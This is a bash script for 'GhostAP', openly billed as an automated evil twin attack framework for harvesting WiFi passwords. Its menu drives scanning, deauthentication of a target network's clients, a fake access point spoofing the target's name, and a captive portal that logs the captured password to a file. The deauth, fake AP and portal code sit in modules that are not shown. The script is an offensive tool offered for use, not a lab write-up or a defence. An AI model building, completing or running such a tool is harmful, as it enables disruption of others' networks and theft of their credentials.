#!/usr/bin/env bash
# ======================================================================
#  GhostAP — Automated Evil Twin Attack Framework
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: One-click WiFi credential harvesting via evil twin attack
#  Repository: [your-repo-here]
# ======================================================================
#  "The ghost in the network — unseen, undeniable."
# ======================================================================

set -o pipefail
trap 'cleanup_and_exit' SIGINT SIGTERM SIGHUP EXIT

# ======================================================================
#  ASCII BANNER
# ======================================================================
banner() {
    clear
    cat << "BANNER"

     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗ █████╗ ██████╗ 
    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
    ██║  ███╗███████║██║   ██║███████╗   ██║   ███████║██████╔╝
    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔══██║██╔═══╝ 
    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║     
     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     
                                                               
          ░█▀▀░█░█░█▀█░█▀▀░▀█▀░█▀█░█▀█
          ░█░█░█▀█░█▀█░▀▀█░░█░░█▀▀░█▀▀
          ░▀▀▀░▀░▀░▀░▀░▀▀▀░░▀░░▀░░░▀░░

              Automated Evil Twin Attack Framework
    ═══════════════════════════════════════════════════════════
     Developer : ATHEX BLACK HAT
     Version   : 1.0.0
     Type      : WiFi Credential Harvester (Evil Twin)
    ═══════════════════════════════════════════════════════════

BANNER
}

# ======================================================================
#  SOURCE CONFIGURATION & LIBRARIES
# ======================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

source "${SCRIPT_DIR}/config/colors.sh" 2>/dev/null || {
    # fallback colors if colors.sh missing
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; WHITE='\033[1;37m'
    BOLD='\033[1m'; NC='\033[0m'
}

source "${SCRIPT_DIR}/config/settings.conf" 2>/dev/null || {
    # fallback defaults
    LOG_DIR="${SCRIPT_DIR}/logs"
    PASSWORD_FILE="${LOG_DIR}/passwords.txt"
    SESSION_LOG="${LOG_DIR}/session.log"
    CAPTURE_SIGNAL="/tmp/ghostap_captured"
    PORTAL_PORT="80"
    FAKE_AP_GATEWAY="10.0.0.1"
}

source "${SCRIPT_DIR}/lib/logger.sh" 2>/dev/null || {
    log_msg() { echo -e "[$(date '+%H:%M:%S')] $*"; }
    log_success() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }
    log_error() { echo -e "${RED}[$(date '+%H:%M:%S')] [-] $*${NC}"; }
    log_info() { echo -e "${CYAN}[$(date '+%H:%M:%S')] [*] $*${NC}"; }
    log_warn() { echo -e "${YELLOW}[$(date '+%H:%M:%S')] [!] $*${NC}"; }
}

source "${SCRIPT_DIR}/lib/utils.sh" 2>/dev/null
source "${SCRIPT_DIR}/lib/interface.sh" 2>/dev/null

# ======================================================================
#  GLOBAL VARIABLES
# ======================================================================
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CHANNEL=""
MON_IFACE=""
MANAGED_IFACE=""
DEAUTH_PID=""
HOSTAPD_PID=""
DNSMASQ_PID=""
PORTAL_PID=""
ATTACK_ACTIVE=false
SESSION_START=$(date '+%Y-%m-%d %H:%M:%S')

# ======================================================================
#  HELPER FUNCTIONS
# ======================================================================

# --- privilege check ---
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[✗] Root privileges required.${NC}"
        echo -e "${YELLOW}    Run: sudo bash GhostAP.sh${NC}"
        exit 1
    fi
}

# --- dependency check ---
check_dependencies() {
    log_info "Checking dependencies..."
    local missing=()
    local required=("airmon-ng" "airodump-ng" "aireplay-ng" "hostapd" "dnsmasq" "python3" "xterm" "iptables")
    
    for cmd in "${required[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    
    # check python flask
    if ! python3 -c "import flask" 2>/dev/null; then
        missing+=("python3-flask")
    fi
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        log_error "Missing dependencies: ${missing[*]}"
        echo -e "${YELLOW}    Install: sudo apt install aircrack-ng hostapd dnsmasq python3 python3-pip xterm iptables -y${NC}"
        echo -e "${YELLOW}    Then: pip3 install flask${NC}"
        exit 1
    fi
    log_success "All dependencies satisfied."
}

# --- session setup ---
setup_session() {
    mkdir -p "${LOG_DIR}/scan_results"
    touch "$SESSION_LOG"
    touch "$PASSWORD_FILE"
    log_msg "=== GhostAP Session Started: $SESSION_START ===" >> "$SESSION_LOG"
    log_info "Session started at $SESSION_START"
}

# --- cleanup on exit ---
cleanup_and_exit() {
    echo ""
    log_warn "Initiating cleanup..."
    
    # kill background processes
    [[ -n "$DEAUTH_PID" ]] && kill "$DEAUTH_PID" 2>/dev/null
    [[ -n "$HOSTAPD_PID" ]] && kill "$HOSTAPD_PID" 2>/dev/null
    [[ -n "$DNSMASQ_PID" ]] && kill "$DNSMASQ_PID" 2>/dev/null
    [[ -n "$PORTAL_PID" ]] && kill "$PORTAL_PID" 2>/dev/null
    
    # restore iptables
    iptables --flush 2>/dev/null
    iptables --table nat --flush 2>/dev/null
    
    # stop monitor mode
    if [[ -n "$MON_IFACE" ]]; then
        airmon-ng stop "$MON_IFACE" 2>/dev/null
    fi
    
    # restart network manager
    systemctl restart NetworkManager 2>/dev/null &
    
    # remove temp files
    rm -f /tmp/ghostap_* 2>/dev/null
    rm -f /tmp/evil_twin_* 2>/dev/null
    
    # session end
    log_msg "=== Session Ended: $(date '+%Y-%m-%d %H:%M:%S') ===" >> "$SESSION_LOG"
    log_info "Cleanup complete. Interface restored."
    
    exit 0
}

# --- display help ---
show_help() {
    banner
    cat << HELP
${CYAN}USAGE:${NC}
    sudo bash GhostAP.sh [OPTIONS]

${CYAN}OPTIONS:${NC}
    -h, --help          Show this help message
    -v, --version       Display version information
    -s, --scan-only     Only scan networks, exit after selection
    -a, --auto          Auto-select strongest network with clients

${CYAN}INTERACTIVE MENU:${NC}
    1. Scan & Select Target
    2. Start Full Attack (Scan → Deauth → AP → Portal → Capture)
    3. Deauth Only (target specific BSSID)
    4. Fake AP Only (no deauth, captive portal)
    5. View Captured Passwords
    6. Exit

${CYAN}EXAMPLES:${NC}
    sudo bash GhostAP.sh              # Interactive mode
    sudo bash GhostAP.sh -a           # Auto mode
    sudo bash GhostAP.sh -s           # Scan only

${YELLOW}Developer: ATHEX BLACK HAT${NC}
${YELLOW}Version: 1.0.0${NC}

HELP
    exit 0
}

# --- display version ---
show_version() {
    echo -e "${GREEN}GhostAP v1.0.0${NC}"
    echo -e "${YELLOW}Developer: ATHEX BLACK HAT${NC}"
    echo -e "Automated Evil Twin Attack Framework"
    exit 0
}

# ======================================================================
#  MAIN MENU
# ======================================================================
show_menu() {
    banner
    echo ""
    echo -e "${WHITE}${BOLD}═══════════ MAIN MENU ═══════════${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC}  Scan & Select Target Network"
    echo -e "  ${GREEN}[2]${NC}  ${RED}▶ START FULL ATTACK${NC} ${YELLOW}(Scan → Deauth → Spoof → Capture)${NC}"
    echo -e "  ${GREEN}[3]${NC}  Deauth Attack Only"
    echo -e "  ${GREEN}[4]${NC}  Fake AP + Portal Only (no deauth)"
    echo -e "  ${GREEN}[5]${NC}  View Captured Passwords"
    echo -e "  ${GREEN}[6]${NC}  Check Dependencies"
    echo -e "  ${GREEN}[7]${NC}  Restore Network (cleanup)"
    echo -e "  ${RED}[0]${NC}  Exit"
    echo ""
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo ""
    
    read -p "$(echo -e "${CYAN}GhostAP > ${NC}")" CHOICE
    
    case $CHOICE in
        1) scan_and_select ;;
        2) full_attack ;;
        3) deauth_only ;;
        4) fake_ap_only ;;
        5) view_passwords ;;
        6) check_dependencies ;;
        7) cleanup_and_exit ;;
        0) cleanup_and_exit ;;
        *) log_warn "Invalid option. Try again."; sleep 1; show_menu ;;
    esac
}

# ======================================================================
#  STAGE 1: SCAN & SELECT
# ======================================================================
scan_and_select() {
    banner
    echo -e "${CYAN}[*] Starting network scanner...${NC}"
    
    if [[ -f "${SCRIPT_DIR}/modules/scanner.sh" ]]; then
        source "${SCRIPT_DIR}/modules/scanner.sh"
        run_scanner
        # scanner returns TARGET_BSSID, TARGET_ESSID, TARGET_CHANNEL, MON_IFACE
    else
        log_error "Scanner module not found: modules/scanner.sh"
        log_warn "Module not yet implemented. Placeholder active."
        sleep 2
    fi
    
    # if target selected, offer next step
    if [[ -n "$TARGET_BSSID" ]]; then
        echo ""
        echo -e "${GREEN}Target Locked:${NC}"
        echo -e "  ESSID   : ${YELLOW}$TARGET_ESSID${NC}"
        echo -e "  BSSID   : ${YELLOW}$TARGET_BSSID${NC}"
        echo -e "  Channel : ${YELLOW}$TARGET_CHANNEL${NC}"
        echo ""
        read -p "$(echo -e "${RED}[?] Proceed with full attack? (y/n): ${NC}")" PROCEED
        if [[ "$PROCEED" =~ ^[Yy]$ ]]; then
            launch_attack
        else
            show_menu
        fi
    else
        log_error "No target selected."
        sleep 2
        show_menu
    fi
}

# ======================================================================
#  STAGE 2: FULL ATTACK SEQUENCE
# ======================================================================
full_attack() {
    scan_and_select
}

launch_attack() {
    banner
    ATTACK_ACTIVE=true
    
    echo -e "${RED}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║       LAUNCHING ATTACK SEQUENCE      ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""
    log_info "Target: $TARGET_ESSID ($TARGET_BSSID) on channel $TARGET_CHANNEL"
    echo ""
    
    # --- Phase 1: Deauth ---
    echo -e "${MAGENTA}[Phase 1/3]${NC} Starting deauthentication attack..."
    if [[ -f "${SCRIPT_DIR}/modules/deauth.sh" ]]; then
        source "${SCRIPT_DIR}/modules/deauth.sh"
        start_deauth "$TARGET_BSSID" "$TARGET_CHANNEL" "$MON_IFACE"
        DEAUTH_PID=$!
        log_success "Deauth running (PID: $DEAUTH_PID)"
    else
        log_warn "Deauth module missing. Skipping..."
    fi
    
    sleep 2
    
    # --- Phase 2: Fake AP ---
    echo -e "${MAGENTA}[Phase 2/3]${NC} Launching fake access point..."
    if [[ -f "${SCRIPT_DIR}/modules/fake_ap.sh" ]]; then
        source "${SCRIPT_DIR}/modules/fake_ap.sh"
        start_fake_ap "$TARGET_ESSID" "$TARGET_CHANNEL" "$MON_IFACE"
        HOSTAPD_PID=$HOSTAPD_PID_RET
        DNSMASQ_PID=$DNSMASQ_PID_RET
        log_success "Fake AP broadcasting as '$TARGET_ESSID'"
    else
        log_warn "Fake AP module missing. Skipping..."
    fi
    
    sleep 2
    
    # --- Phase 3: Captive Portal ---
    echo -e "${MAGENTA}[Phase 3/3]${NC} Starting captive portal..."
    if [[ -f "${SCRIPT_DIR}/modules/captive_portal.sh" ]]; then
        source "${SCRIPT_DIR}/modules/captive_portal.sh"
        start_portal "$TARGET_ESSID" "$MON_IFACE"
        PORTAL_PID=$PORTAL_PID_RET
        log_success "Captive portal live on port $PORTAL_PORT"
    else
        log_warn "Captive portal module missing. Skipping..."
    fi
    
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║       ATTACK ACTIVE — WAITING        ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""
    log_info "Waiting for password capture..."
    log_warn "Press Ctrl+C to stop attack & cleanup"
    echo ""
    
    # --- Monitor for capture ---
    while $ATTACK_ACTIVE; do
        if [[ -f "$CAPTURE_SIGNAL" ]]; then
            PASSWORD=$(cat "$CAPTURE_SIGNAL")
            timestamp=$(date '+%Y-%m-%d %H:%M:%S')
            
            # save to log
            echo "[$timestamp] ESSID: $TARGET_ESSID | Password: $PASSWORD" >> "$PASSWORD_FILE"
            
            echo ""
            echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}${BOLD}║          🔑 PASSWORD CAPTURED!               ║${NC}"
            echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════╣${NC}"
            echo -e "${GREEN}║${NC}  ESSID     : ${YELLOW}$TARGET_ESSID${GREEN}                         ║${NC}"
            echo -e "${GREEN}║${NC}  Password  : ${YELLOW}$PASSWORD${GREEN}                              ║${NC}"
            echo -e "${GREEN}║${NC}  Saved to  : ${WHITE}$PASSWORD_FILE${GREEN}  ║${NC}"
            echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════╝${NC}"
            echo ""
            
            log_success "Credential harvested successfully."
            ATTACK_ACTIVE=false
            rm -f "$CAPTURE_SIGNAL"
            
            read -p "$(echo -e "${CYAN}[?] Press Enter to cleanup & exit...${NC}")" _
            cleanup_and_exit
        fi
        sleep 1
    done
}

# ======================================================================
#  DEAUTH ONLY
# ======================================================================
deauth_only() {
    banner
    log_info "Manual deauth mode."
    log_warn "Module under development."
    sleep 2
    show_menu
}

# ======================================================================
#  FAKE AP ONLY
# ======================================================================
fake_ap_only() {
    banner
    log_info "Fake AP + Portal mode (no deauth)."
    log_warn "Module under development."
    sleep 2
    show_menu
}

# ======================================================================
#  VIEW CAPTURED PASSWORDS
# ======================================================================
view_passwords() {
    banner
    echo -e "${CYAN}═══ Captured Passwords ═══${NC}"
    echo ""
    if [[ -f "$PASSWORD_FILE" ]] && [[ -s "$PASSWORD_FILE" ]]; then
        cat "$PASSWORD_FILE"
    else
        echo -e "${YELLOW}No passwords captured yet.${NC}"
    fi
    echo ""
    read -p "$(echo -e "${CYAN}[?] Press Enter to return...${NC}")" _
    show_menu
}

# ======================================================================
#  ARGUMENT PARSING
# ======================================================================
parse_args() {
    case "$1" in
        -h|--help)    show_help ;;
        -v|--version) show_version ;;
        -s|--scan-only)
            check_root
            check_dependencies
            setup_session
            scan_and_select
            cleanup_and_exit
            ;;
        -a|--auto)
            check_root
            check_dependencies
            setup_session
            log_info "Auto mode — selecting strongest network with clients..."
            log_warn "Auto-select module under development."
            scan_and_select
            ;;
        *)
            # no valid flag, launch interactive
            check_root
            check_dependencies
            setup_session
            show_menu
            ;;
    esac
}

# ======================================================================
#  ENTRY POINT
# ======================================================================
main() {
    if [[ $# -gt 0 ]]; then
        parse_args "$1"
    else
        check_root
        check_dependencies
        setup_session
        show_menu
    fi
}

main "$@"